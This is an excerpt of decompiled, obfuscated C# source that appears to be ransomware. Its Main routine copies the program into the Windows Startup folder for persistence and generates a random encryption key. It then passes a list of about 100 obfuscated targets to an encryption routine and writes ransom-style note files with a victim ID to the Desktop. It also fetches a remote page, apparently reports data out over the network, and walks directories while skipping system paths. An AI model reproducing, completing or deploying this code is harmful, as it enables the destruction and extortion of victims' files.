								ogLAgAYNFI(CS_0024_003C_003E8__locals0.HFkAavNBdZG, CS_0024_003C_003E8__locals0.HFkAavNBdZG + getString_0(107388817), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!HtEoifwVYHx)
								{
									OoNZqxrDFxbIfCy(CS_0024_003C_003E8__locals0.HFkAavNBdZG, CS_0024_003C_003E8__locals0.HFkAavNBdZG, bmXnqjSSiXMovR);
								}
								else
								{
									OoNZqxrDFxbIfCy(CS_0024_003C_003E8__locals0.HFkAavNBdZG, CS_0024_003C_003E8__locals0.HFkAavNBdZG, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex14)
							{
								if (XZxMDRItGAyFV)
								{
									try
									{
										File.AppendAllText(yOCAHBSkOQrG, getString_0(107388562) + CS_0024_003C_003E8__locals0.HFkAavNBdZG + getString_0(107388264) + ex14.Message + getString_0(107396383));
									}
									catch (Exception)
									{
									}
								}
								cRWjcXvHmjJ++;
								return;
							}
						}
						if (HtEoifwVYHx)
						{
							if (jMMRdoeBzVf != getString_0(107388822))
							{
								sefrHhiPzMkPz(CS_0024_003C_003E8__locals0.HFkAavNBdZG + jMMRdoeBzVf, bytes2);
							}
							else
							{
								sefrHhiPzMkPz(CS_0024_003C_003E8__locals0.HFkAavNBdZG, bytes2);
							}
						}
					}
					end_IL_031d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0ac1;
			IL_0ac1:
			yLHvSWZyIOfSs.Remove(CS_0024_003C_003E8__locals0.HFkAavNBdZG);
		}

		static QNsCvQIrCsizt()
		{
			Strings.CreateGetStringDelegate(typeof(QNsCvQIrCsizt));
		}
	}

	private sealed class mbaFPWLgJuSp
	{
		public string ErUnvrROTFAPOKHv;

		public string dwwrLJBHjf;

		public void _003CEncrypt2_003Eb__3b()
		{
			while (true)
			{
				try
				{
					File.Delete(ErUnvrROTFAPOKHv);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__3c()
		{
			while (true)
			{
				try
				{
					if (File.Exists(dwwrLJBHjf))
					{
						File.Delete(dwwrLJBHjf);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string hyLfSqtXAS;

	public static byte[] bmXnqjSSiXMovR;

	public static string PAdnDlyZDpGVLVKD;

	public static string IDJKHdVBMvjds;

	public static List<string> sxPtPKBcUpYvx;

	public static List<string> pVzaRedCMIpKs;

	public static string OmzhUjlDEurAAJfh;

	public static string slZaBQOSteyNrUAU;

	public static string osFCMcDnuAmVJ;

	public static string wdINutYpolH;

	public static int TVdsRIfJiWY;

	public static string yhFbdsJLRKYdl;

	public static string sfKUrJOwwyeevE;

	public static string XFaoeuCHbxWZ;

	public static string FmxMIEeZvPH;

	public static string dNiIQejPhKTAAD;

	public static string pRxtnAQEqojJLMRYE;

	public static string sJvshgscNjJYn;

	public static string ZdvAQIpEKLz;

	public static List<string> IsQXbqdkNJQK;

	public static List<string> fFYazcYEiRSnDfdk;

	public static string IKKOInUjhiN;

	public static string bbdmfuVmkx;

	public static string MyVVpyjLiioez;

	public static List<string> HHTmAplzYnkC;

	public static string dgWoFfCnCwuYomH;

	private static string iXyADGvOnFQdb;

	public static string YuSNGaINVaPF;

	public static string eOlZAtGeqIY;

	public static List<string> WhfHkjDKmYuP;

	public static List<string> oPyjYPETMmli;

	public static List<string> oMrXAbQxDplP;

	public static List<string> upVRuDGmCWJQ;

	public static string UByhimbdThATly;

	public static List<string> aIfPmSkTtrdy;

	public static List<string> FRPythUbglak;

	public static string feIEYOlzhPudDuY;

	public static string jEIhBcAvhNtAJv;

	internal static DateTime LKtExEHEvHeFz;

	internal static DateTime ZTUGBPbyfZV;

	public static string xUUeBPLKKIuVcVa;

	public static string DtPlrxKatW;

	public static string hDgxtMFNYCZAq;

	public static string aLOFoESbzg;

	public static string dnYxKIPqbMQv;

	public static string ackDGaHCSjd;

	public static string bChhwWwyPudZf;

	public static string GymFZfNQBIzJM;

	public static List<string> WKHvNffqtncUxo;

	public static string PoekpaMfsIzdNH;

	public static string LrknPqaBUod;

	public static string WHsxbugkfTpP;

	public static string hkUPNgknXz;

	public static string PgCIesilwOIY;

	public static string VuhhsoWreU;

	public static string puLAVQUwlLWj;

	public static string QYYMsdrjbfJD;

	public static string PFzMaUdNddQhk;

	public static string razXaKnrymBimf;

	public static string XJIvSEvhRWv;

	public static string KOluhQMWkLbZQoDEA;

	public static string nizxbbcBJHCi;

	public static string nukUwKRHPU;

	public static string FGSXrKRlPlDq;

	public static string dqsWBzqpEE;

	public static string qvqgJKEgPBPpCQ;

	public static string pnPQEdVlPuLyPx;

	public static string XHoBEdhIrnbaf;

	public static string jvLiLiQoTuDZZR;

	public static string iLkmHPmfNvtm;

	public static string RqaWMeLFMQxPAB;

	public static string TCdHkbwrIHU;

	public static string MgoyMcoTcpa;

	public static string zYroySqbtjDyt;

	public static string zvUcEMmBCpOj;

	public static string ZEIkjDrMet;

	public static string JHaXJxMluKe;

	public static string aKpUdfVQdWlk;

	public static string[] UCfuYUimljPybsPL;

	public static string BfrRvpyDja;

	public static bool AUEsBSTinpTuD;

	public static string nlOxlvkWxTCJA;

	public static bool HtEoifwVYHx;

	public static bool SoTONMHChTZ;

	public static bool ENaXCPfxXtv;

	public static bool iAmHXtmwAb;

	public static string yOCAHBSkOQrG;

	public static bool XZxMDRItGAyFV;

	public static bool BHoDUZPWHn;

	public static bool cgrOatWqSETgP;

	public static bool RNbLVUbXIeVe;

	public static bool VdDqLkflmc;

	public static string yPUIdDWXTirNp;

	public static bool AvItfCfoelurZ;

	public static Stopwatch sZZMxYXPerfNNI;

	public static int cRWjcXvHmjJ;

	public static int JsWoTAjDEfI;

	public static bool JpnkvfNRcNgFvyr;

	public static string YGiQSxTfeRxLt;

	public static string[] wsQwuCvErnv;

	public static List<string> rmMGjONPcxR;

	public static int iKHUfSHiDFPcF;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatec;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			EdZaEJechbVY CS_0024_003C_003E8__locals0 = new EdZaEJechbVY();
			CS_0024_003C_003E8__locals0.edxNCRypBgXcqS = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.edxNCRypBgXcqS) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			AcpPBvupiwZLpQR.PELNnvFbgvJjX(iXyADGvOnFQdb);
		}
		catch (Exception)
		{
		}
		try
		{
			if (zvUcEMmBCpOj == getString_0(107396930))
			{
				Thread thread = new Thread(DuLhfNSlaLZnukEWc.CBrxkUBVsFwgoF);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (XFaoeuCHbxWZ == getString_0(107396930))
		{
			Thread.Sleep(int.Parse(FmxMIEeZvPH));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && bChhwWwyPudZf == getString_0(107396930))
		{
			try
			{
				VDXdVFekUfOSrU(EGPIgSWIAKjM(getString_0(107396925)));
			}
			catch
			{
			}
		}
		try
		{
			if (sJvshgscNjJYn == getString_0(107396930) && DUnZUTnPzANr.NWouAODuDSantYqp())
			{
				new BsdcOFapuj().RMqQvODFbPak(bool_0: false);
				DUnZUTnPzANr.KKYmkOsCnfwJ();
			}
		}
		catch (Exception)
		{
		}
		if (bbdmfuVmkx == getString_0(107396930) && DUnZUTnPzANr.NWouAODuDSantYqp())
		{
			new BsdcOFapuj().RMqQvODFbPak(bool_0: false);
			new BsdcOFapuj().gjpalJEBQQ();
		}
		if (sfKUrJOwwyeevE == getString_0(107396930))
		{
			jzhguaKdfrBa.aRsbDKqQTOtgkr();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396788);
			string text2 = text + Path.GetFileName(fileName);
			if (wdINutYpolH == getString_0(107396930) && fileName != text2)
			{
				Thread thread2 = new Thread(fIVNSuaRMlu);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (OmzhUjlDEurAAJfh == getString_0(107396930) && mainModule != null && fileName != text2)
			{
				try
				{
					TVdsRIfJiWY = ilpbJNmmMgNzy(0, IsQXbqdkNJQK.Count);
					File.Copy(fileName, text + IsQXbqdkNJQK[TVdsRIfJiWY], overwrite: true);
					Process.Start(text + IsQXbqdkNJQK[TVdsRIfJiWY]);
					STbtyipgaiFwyyV();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (feIEYOlzhPudDuY == getString_0(107396930) && DateTime.Now < LKtExEHEvHeFz)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (jEIhBcAvhNtAJv == getString_0(107396930) && DateTime.Now > ZTUGBPbyfZV)
			{
				STbtyipgaiFwyyV();
			}
		}
		catch
		{
		}
		UcdApWvUtGru();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatec == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatec = delegate
			{
				List<string> source = oPyjYPETMmli;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						OVDOHnvaqGQX(EGPIgSWIAKjM(getString_0(107388226)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				List<string> source2 = oMrXAbQxDplP;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
					{
						OVDOHnvaqGQX(EGPIgSWIAKjM(getString_0(107388181)), string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				if (aKpUdfVQdWlk == getString_0(107396930))
				{
					string[] uCfuYUimljPybsPL = UCfuYUimljPybsPL;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							OVDOHnvaqGQX(EGPIgSWIAKjM(getString_0(107388181)), getString_0(107388156) + string_0 + getString_0(107388147));
						};
					}
					Parallel.ForEach(uCfuYUimljPybsPL, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				if (!HOGYmrndAaRDe().Contains(getString_0(107388891)))
				{
					mjzeUtGoNzXmfZH(UByhimbdThATly);
				}
				else
				{
					List<string> source3 = upVRuDGmCWJQ;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
						{
							OVDOHnvaqGQX(EGPIgSWIAKjM(GQbUuBJqDRmd(getString_0(107388142))), string_0);
						};
					}
					Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				}
				List<string> source4 = aIfPmSkTtrdy;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
					{
						OVDOHnvaqGQX(EGPIgSWIAKjM(getString_0(107388117)), string_0);
					};
				}
				Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatec);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396783))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396783)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(getString_0(107396798)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !sxPtPKBcUpYvx.Contains(text6) && text6 != getString_0(107396777) && text6 != getString_0(107396724) && text6 != getString_0(107396735))
								{
									sxPtPKBcUpYvx.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107397218)))
					{
						string text7 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397173))
						{
							nizxbbcBJHCi = getString_0(107396930);
						}
						else if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397196))
						{
							nizxbbcBJHCi = getString_0(107397187);
						}
					}
					if (text3.Contains(getString_0(107397182)))
					{
						string text8 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107397173))
						{
							AvItfCfoelurZ = true;
						}
						else if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107397196))
						{
							AvItfCfoelurZ = false;
						}
					}
					if (text3.Contains(getString_0(107397133)))
					{
						string text9 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107397173))
						{
							XZxMDRItGAyFV = true;
						}
						else if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107397196))
						{
							XZxMDRItGAyFV = false;
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (XZxMDRItGAyFV)
			{
				try
				{
					File.AppendAllText(yOCAHBSkOQrG, getString_0(107397152) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (nizxbbcBJHCi == getString_0(107397187))
		{
			pFqQuMWLVLQyQS();
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && ENaXCPfxXtv)
			{
				try
				{
					Thread thread4 = new Thread(DidmuRTNrmknEsJB.nTaIMASTvbcco);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			OVDOHnvaqGQX(getString_0(107397075), EGPIgSWIAKjM(getString_0(107397094)));
		}
		if (IKKOInUjhiN == getString_0(107396930) && AJPgtAMuYftvrfR() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread5 = new Thread(ALWxYxJSCzwHN.obuCHlRegGA);
			thread5.IsBackground = true;
			thread5.Priority = ThreadPriority.Normal;
			thread5.Start();
		}
		_ = eOlZAtGeqIY == getString_0(107396930);
		SecureString secureString = new SecureString();
		if (hDgxtMFNYCZAq == getString_0(107397187))
		{
			Random random = new Random();
			for (int k = 0; k < 32; k++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					k--;
				}
			}
		}
		else
		{
			slZaBQOSteyNrUAU = getString_0(107397021);
		}
		osFCMcDnuAmVJ = uibsyoaCixjw.DOQQVROAHbcwo(VbkfzVDMGVYRp(secureString));
		if (cgrOatWqSETgP)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), yPUIdDWXTirNp)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), yPUIdDWXTirNp), string.Concat(EGPIgSWIAKjM(getString_0(107396432)), new WebClient().DownloadString(EGPIgSWIAKjM(getString_0(107396407))), getString_0(107396366), EGPIgSWIAKjM(getString_0(107396393)), DateTime.Now, getString_0(107396366), EGPIgSWIAKjM(getString_0(107396352)), osFCMcDnuAmVJ));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), yPUIdDWXTirNp), getString_0(107396295) + osFCMcDnuAmVJ);
				}
			}
			catch (Exception ex9)
			{
				if (XZxMDRItGAyFV)
				{
					try
					{
						File.AppendAllText(yOCAHBSkOQrG, getString_0(107396266) + ex9.Message + getString_0(107396366));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		lUZTqoTtayk.MpzqpgZSIXQk(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), jvLiLiQoTuDZZR), sQzmjgGwzuanY(osFCMcDnuAmVJ), null, null, getString_0(107396697), getString_0(107396712), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			ETtmljrWZSlTm();
		}
		try
		{
			try
			{
				if (AvItfCfoelurZ)
				{
					Console.WriteLine(getString_0(107396663));
				}
			}
			catch
			{
			}
			YNKEnDcWehEvB(new string[1] { getString_0(107396646) }, new string[100]
			{
				getString_0(107396637),
				getString_0(107396600),
				getString_0(107396595),
				getString_0(107396618),
				getString_0(107396613),
				getString_0(107396608),
				getString_0(107396571),
				getString_0(107396566),
				getString_0(107396561),
				getString_0(107396588),
				getString_0(107396583),
				getString_0(107396578),
				getString_0(107396537),
				getString_0(107396532),
				getString_0(107396555),
				getString_0(107396550),
				getString_0(107396545),
				getString_0(107396508),
				getString_0(107396503),
				getString_0(107396498),
				getString_0(107396521),
				getString_0(107396516),
				getString_0(107396511),
				getString_0(107396474),
				getString_0(107396469),
				getString_0(107396464),
				getString_0(107396491),
				getString_0(107396486),
				getString_0(107396481),
				getString_0(107395932),
				getString_0(107395927),
				getString_0(107395922),
				getString_0(107395917),
				getString_0(107395944),
				getString_0(107395935),
				getString_0(107395898),
				getString_0(107395893),
				getString_0(107395888),
				getString_0(107396571),
				getString_0(107395915),
				getString_0(107396561),
				getString_0(107395906),
				getString_0(107395901),
				getString_0(107395864),
				getString_0(107395859),
				getString_0(107395854),
				getString_0(107395881),
				getString_0(107395876),
				getString_0(107395871),
				getString_0(107395834),
				getString_0(107395829),
				getString_0(107395824),
				getString_0(107395851),
				getString_0(107395846),
				getString_0(107395841),
				getString_0(107395804),
				getString_0(107395799),
				getString_0(107395794),
				getString_0(107395817),
				getString_0(107395812),
				getString_0(107395771),
				getString_0(107395758),
				getString_0(107395915),
				getString_0(107395777),
				getString_0(107395736),
				getString_0(107395727),
				getString_0(107395750),
				getString_0(107395741),
				getString_0(107395700),
				getString_0(107395695),
				getString_0(107395718),
				getString_0(107395709),
				getString_0(107396180),
				getString_0(107396175),
				getString_0(107396202),
				getString_0(107396197),
				getString_0(107396192),
				getString_0(107396155),
				getString_0(107396150),
				getString_0(107396141),
				getString_0(107396168),
				getString_0(107396163),
				getString_0(107396158),
				getString_0(107396121),
				getString_0(107396116),
				getString_0(107396139),
				getString_0(107396130),
				getString_0(107396125),
				getString_0(107395917),
				getString_0(107396088),
				getString_0(107396083),
				getString_0(107396078),
				getString_0(107396105),
				getString_0(107396100),
				getString_0(107396059),
				getString_0(107396054),
				getString_0(107396049),
				getString_0(107396072),
				getString_0(107396067),
				getString_0(107396062)
			}, new string[0], VbkfzVDMGVYRp(secureString), getString_0(107396025));
		}
		catch (Exception ex11)
		{
			if (XZxMDRItGAyFV)
			{
				try
				{
					File.AppendAllText(yOCAHBSkOQrG, getString_0(107396044) + ex11.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395987)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395987));
				streamWriter.WriteLine(EGPIgSWIAKjM(getString_0(107395954)));
				streamWriter.WriteLine(getString_0(107396366));
				streamWriter.WriteLine(EGPIgSWIAKjM(getString_0(107392072)));
				streamWriter.WriteLine(osFCMcDnuAmVJ);
				if (YuSNGaINVaPF == getString_0(107397187))
				{
					streamWriter.WriteLine(getString_0(107396366));
					streamWriter.WriteLine(EGPIgSWIAKjM(getString_0(107392039)) + Convert.ToString(HHTmAplzYnkC.Count));
				}
				if (JpnkvfNRcNgFvyr)
				{
					streamWriter.WriteLine(getString_0(107396366));
					streamWriter.WriteLine(EGPIgSWIAKjM(getString_0(107391930)));
					streamWriter.WriteLine(XWEZyRndCFE.HppztbCiyZDw());
				}
			}
			else
			{
				string text10 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395987));
				if (!text10.Contains(osFCMcDnuAmVJ) && !HtEoifwVYHx)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395987), getString_0(107391897) + osFCMcDnuAmVJ);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in fFYazcYEiRSnDfdk)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395987)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395987), item + getString_0(107395987), overwrite: true);
				}
				else
				{
					string text11 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395987));
					if (!text11.Contains(osFCMcDnuAmVJ) && !HtEoifwVYHx)
					{
						File.AppendAllText(item + getString_0(107395987), getString_0(107391897) + osFCMcDnuAmVJ);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!iAmHXtmwAb && num > 10)
			{
				break;
			}
		}
		if (TCdHkbwrIHU == getString_0(107396930))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391868)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391868));
					streamWriter2.WriteLine(EGPIgSWIAKjM(getString_0(107391323)));
					streamWriter2.WriteLine(getString_0(107396366));
					streamWriter2.WriteLine(EGPIgSWIAKjM(getString_0(107391338)));
					streamWriter2.WriteLine(osFCMcDnuAmVJ + EGPIgSWIAKjM(getString_0(107391217)));
					if (YuSNGaINVaPF == getString_0(107397187))
					{
						streamWriter2.WriteLine(getString_0(107396366));
						streamWriter2.WriteLine(EGPIgSWIAKjM(getString_0(107391236)) + EGPIgSWIAKjM(getString_0(107392039)) + Convert.ToString(HHTmAplzYnkC.Count) + EGPIgSWIAKjM(getString_0(107391217)));
					}
					if (JpnkvfNRcNgFvyr)
					{
						streamWriter2.WriteLine(getString_0(107396366));
						streamWriter2.WriteLine(EGPIgSWIAKjM(getString_0(107391930)));
						streamWriter2.WriteLine(XWEZyRndCFE.HppztbCiyZDw());
					}
				}
				else
				{
					string text12 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395987));
					if (!text12.Contains(osFCMcDnuAmVJ) && !HtEoifwVYHx)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391868), EGPIgSWIAKjM(getString_0(107391236)) + getString_0(107391897) + osFCMcDnuAmVJ + EGPIgSWIAKjM(getString_0(107391217)));
					}
				}
			}
			catch
			{
			}
		}
		if (dgWoFfCnCwuYomH == getString_0(107396930))
		{
			try
			{
				if (YuSNGaINVaPF == getString_0(107397187))
				{
					XWEZyRndCFE.STFcAtlvEC(getString_0(107391175), getString_0(107391170), getString_0(107391125), string.Concat(EGPIgSWIAKjM(getString_0(107396432)), new WebClient().DownloadString(EGPIgSWIAKjM(getString_0(107396407))), getString_0(107391148), EGPIgSWIAKjM(getString_0(107396393)), DateTime.Now, getString_0(107396366), EGPIgSWIAKjM(getString_0(107391143)), Convert.ToString(HHTmAplzYnkC.Count), getString_0(107396366), EGPIgSWIAKjM(getString_0(107396352)), osFCMcDnuAmVJ));
				}
				else
				{
					XWEZyRndCFE.STFcAtlvEC(getString_0(107391175), getString_0(107391170), getString_0(107391125), string.Concat(EGPIgSWIAKjM(getString_0(107396432)), new WebClient().DownloadString(EGPIgSWIAKjM(getString_0(107396407))), getString_0(107391148), EGPIgSWIAKjM(getString_0(107396393)), DateTime.Now, getString_0(107396366), EGPIgSWIAKjM(getString_0(107391143)), Convert.ToString(HHTmAplzYnkC.Count), getString_0(107396366), EGPIgSWIAKjM(getString_0(107396352)), osFCMcDnuAmVJ));
				}
			}
			catch
			{
			}
		}
		if (ZdvAQIpEKLz == getString_0(107396930))
		{
			try
			{
				iNCxlULaBZ.PaqfGtKNIsY(new Uri(getString_0(107391574)));
			}
			catch
			{
			}
		}
		if (TCdHkbwrIHU == getString_0(107397187))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395987)))
				{
					Process.Start(EGPIgSWIAKjM(getString_0(107391573)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395987));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391868)))
				{
					Process.Start(EGPIgSWIAKjM(getString_0(107391548)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107391868));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(VuhhsoWreU))
		{
			try
			{
				File.Delete(VuhhsoWreU);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396783))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396783)));
			}
		}
		catch (Exception ex14)
		{
			try
			{
				File.AppendAllText(yOCAHBSkOQrG, getString_0(107391563) + ex14.Message);
			}
			catch (Exception)
			{
			}
		}
		if (XZxMDRItGAyFV)
		{
			try
			{
				File.AppendAllText(yOCAHBSkOQrG, getString_0(107391518));
			}
			catch (Exception)
			{
			}
		}
		if (hyLfSqtXAS == getString_0(107391473))
		{
			STbtyipgaiFwyyV();
		}
	}

	public static void fIVNSuaRMlu()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(EGPIgSWIAKjM(getString_0(107391496)), EGPIgSWIAKjM(getString_0(107390798)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int ilpbJNmmMgNzy(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> EJAfsEPAtDcZE(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107390769)) && !text.Contains(getString_0(107390744)) && !text.Contains(getString_0(107390711)) && !text.ToLower().Contains(getString_0(107390726)) && !text.ToLower().Contains(getString_0(107390681)) && !text.Contains(getString_0(107390688)) && !text.Contains(getString_0(107390667)) && !text.ToLower().Contains(getString_0(107390654)) && !text.ToLower().Contains(getString_0(107390609)) && !text.ToLower().Contains(getString_0(107390604)) && !text.ToLower().Contains(getString_0(107390595)) && !text.ToLower().Contains(getString_0(107391058)) && !text.ToLower().Contains(getString_0(107391077)) && !text.ToLower().Contains(getString_0(107391032)) && !text.ToLower().Contains(getString_0(107391043)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107391018)) && !fileInfo.FullName.Contains(getString_0(107390969)) && !fileInfo.FullName.Contains(getString_0(107390984)) && !fileInfo.FullName.Contains(getString_0(107390935)) && !fileInfo.FullName.Contains(getString_0(107390950)) && !fileInfo.FullName.Contains(getString_0(107390901)) && !fileInfo.FullName.Contains(getString_0(107390916)) && !fileInfo.FullName.Contains(getString_0(107390867)) && !fileInfo.FullName.Contains(getString_0(107390886)) && !fileInfo.FullName.Contains(getString_0(107390833)) && !fileInfo.FullName.ToLower().Contains(getString_0(107390852)) && !fileInfo.FullName.ToLower().Contains(getString_0(107390295)) && !fileInfo.FullName.ToLower().Contains(getString_0(107390310)) && !fileInfo.FullName.ToLower().Contains(getString_0(107390261)) && !fileInfo.FullName.Contains(EGPIgSWIAKjM(getString_0(107390276))) && !fileInfo.FullName.Contains(getString_0(107390251)) && !fileInfo.FullName.Contains(getString_0(107396783)) && !fileInfo.FullName.Contains(getString_0(107390238)) && !fileInfo.FullName.EndsWith(getString_0(107396025)) && !fileInfo.FullName.EndsWith(getString_0(107390213)) 